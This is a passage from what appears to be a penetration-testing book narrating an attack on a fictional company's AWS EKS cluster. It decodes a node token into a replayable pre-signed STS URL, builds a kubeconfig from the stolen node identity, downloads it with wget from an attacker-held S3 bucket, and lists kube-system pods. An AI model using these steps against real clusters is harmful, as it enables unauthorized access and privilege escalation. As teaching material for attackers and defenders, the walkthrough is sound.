    | cut -d"_" -f2 \

    | base64 -d \

    | sed "s/8/\\n/g"

    ```


    ```

    https://sts.amazonaws.com/?Action=GetCallerIdentity

    &Version=2011-06-15

    &X-Amz-Algorithm=AWS4-HMAC-SHA256

    &X-Amz-Credential=ASIA4A4ZRK6WSYQ5EI4NS%2F20191118/us-east-1/sts/aws4_request

    &X-Amz-Date=20191118T204239Z

    &X-Amz-Expires=60

    &X-Amz-SignedHeaders=host;x-k8s-aws-id

    &X-Amz-Security-Token=IQoJb3pJz1uX2VjEIX////...

    ```


    The JWT is actually an encoded pre-signed URL that bears the node’s identity.
    Anyone can replay this URL to verify that the node is indeed who it claims to
    be. That’s exactly what EKS does upon receiving this token. Just as AWS IAM trusts
    OpenID to identify and authenticate Kube users (through the means of a JWT), EKS
    trusts IAM to do the same through a web call to the sts.amazon.com endpoint.


    We can use this token in a curl command to the API server like we did earlier,
    but we are better off generating a full Kubectl config that we can download into
    that trustworthy pod of ours:


    ```

    root@Point1:~/# aws eks update-kubeconfig --name prod-euw1 --profile node


    Updated context arn:aws:eks:eu-west-1:886477354405:cluster/prod-euw1 in /root/.kube/config

    shell> wget https://mxrads-archives-packets-linux.s3-eu-west-1.amazonaws.com/config


    shell> mkdir -p /root/.kube && cp config /root/.kube/

    ```


    A quick way to test whether we’ve gained our new privileges is to list the pods
    in the sacred kube-system namespace. This is the namespace that contains the master
    pods—the kube api-server, etcd, coredns—and other critical pods used to administer
    Kubernetes. Remember that our previous tokens were limited to the prod namespace,
    so gaining access to kube-system would be a huge step forward:


    ```

    shell> kubectl get pods -n kube-system

    ```


    | NAME | READY | STATUS | RESTARTS | AGE |

    |---|---|---|---|---|

    | aws-node-hl227 | 1/1 | Running | 0 | 82m |

    | aws-node-v7hrc | 1/1 | Running | 0 | 83m |

    | coredns-759d6fc95f-6z9w | 1/1 | Running | 0 | 89m |

    | coredns-759d6fc95f-ntq88 | 1/1 | Running | 0 | 89m |

    | kube-proxy-724jd | 1/1 | Running | 0 | 83m |

    | kube-proxy-qtc22 | 1/1 | Running | 0 | 82m |

    | --snip-- | | | | |


    We manage to list the pods! Nice! Obviously, since we are in a managed Kubernetes,
    the most vital pods (kube-apiserver, etcd, kube-controller-manager) are kept hidden
    by Amazon, but the rest of the pods are there.'
